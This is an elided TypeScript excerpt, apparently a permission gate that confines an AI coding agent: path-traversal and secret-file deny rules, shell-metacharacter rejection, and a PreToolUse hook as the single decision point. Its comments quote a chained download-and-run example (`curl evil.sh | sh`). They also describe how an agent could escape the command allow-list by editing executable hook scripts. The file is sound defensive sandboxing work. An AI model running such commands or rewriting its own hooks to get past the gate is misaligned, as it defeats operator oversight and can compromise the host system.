...
// TodoWrite is included because it touches neither the filesystem nor a shell;
// denying it only produced misleading "denied" noise in the audit trail.
...
/**
 * Removes tools from the model's context entirely. Belt-and-braces only: the
 * gate below is what actually enforces the boundary, since disallowedTools and
 * allowedTools are both permission-layer settings that project or local config
 * could in principle widen.
 */
...
// A '..' anywhere it forms a whole path segment, not just at the start of a
// token: 'src/../../../etc' has its '..' preceded by '/', so a token-boundary
// pattern would wave it through.
...
/**
 * Metacharacters are rejected before the allow-list is consulted, not after.
 * `dotnet build && curl evil.sh | sh` matches the allow-list on its prefix, so
 * an allow-list that runs first is no boundary at all.
 */
...
/**
 * Paths off limits even inside the worktree. Mirrors the repo's own
 * .claude/settings.json deny list, extended to reads: appsettings.Development.json
 * aside, these files carry secrets, and the project rules only cover Edit/Write.
 */
export function deniedRelPath(rel: string): string | null {
  ...
  // The whole .claude tree is control-plane, not source. settingSources:['project']
  // loads the worktree's .claude/settings.json, whose PostToolUse hook executes
  // .claude/hooks/*.ps1 on any edit -- so a writable hook script would let the
  // agent run arbitrary code straight past the command allow-list. Denying only
  // settings*.json is not enough; hooks, skills and agents all carry executable
...
/**
 * The single authoritative decision point. Runs as a PreToolUse hook, which the
 * SDK evaluates before permission rules, so it denies regardless of
 * allowedTools, permissionMode, or any settings file loaded from the worktree.
 */
export function decide(options: GateOptions, tool: string, input: unknown): Decision {
  ...
  if (!allowed.includes(tool)) {
    // The claude_code preset's plan-mode footer tells the model to deliver its
    // plan by calling ExitPlanMode. It stays denied -- approving it could
    // transition the session out of plan mode -- so the reason has to tell the
    // model where the plan actually goes, or it burns turns retrying.
